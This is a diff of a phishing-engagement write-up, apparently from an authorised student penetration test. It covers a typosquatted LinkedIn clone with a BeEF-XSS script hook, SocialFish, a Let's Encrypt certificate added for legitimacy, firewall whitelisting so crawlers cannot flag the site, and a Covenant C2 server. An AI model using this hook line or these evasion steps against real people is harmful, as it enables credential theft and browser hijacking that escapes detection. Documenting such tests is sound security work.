@@ -57,5 +57,24 @@ a script tag which injects a Beef-XSS payload into the victim's browser.
 ```html
 <script src="http://127.0.0.1:3000/hook.js"></script>
 ```
+Moreover, I used the Let's Encrypt certificate services to increase the legitimacy of my website. That way, the website seemed as if it was an actual
+LinkedIn.
 
-Moreover, I used the Let's Encrypt
+### Blocked domain and new website
+
+![Blocked domain](../../assets/img/phishing/domain_blocked.png)
+
+However, few hours after deploying the website, I have discovered that the domain was blocked. Apparently Google's (probably) web crawlers flagged the
+website as malicious, since the domain name was `linkedlin.ml` and it was a copy of the linkedin front page. Moreover, I was running Beef-XSS and
+SocialFish, which most likely triggered the domain flagging.
+
+This time, we have decided to apply a firewall on our droplet and whitelist Hoefnagels IP address that we obtained from the physical testing, as well as
+ our home and school addresses. I have decided to use `UFW` which was preinstalled on that instance of the Ubuntu server.  
+_I have blurred out the IP addresses since these are sensitive information_
+
+![Firewall rules](../../assets/img/phishing/firewall.png)
+
+The firewall now only allows the selected IP addresses to the port 443 running the website and port 7443 running a C2 server `covenant` which we planned
+to use after compromising victims.
+
+![Blocked domain](../../assets/img/phishing/linkedllin.ml.png)
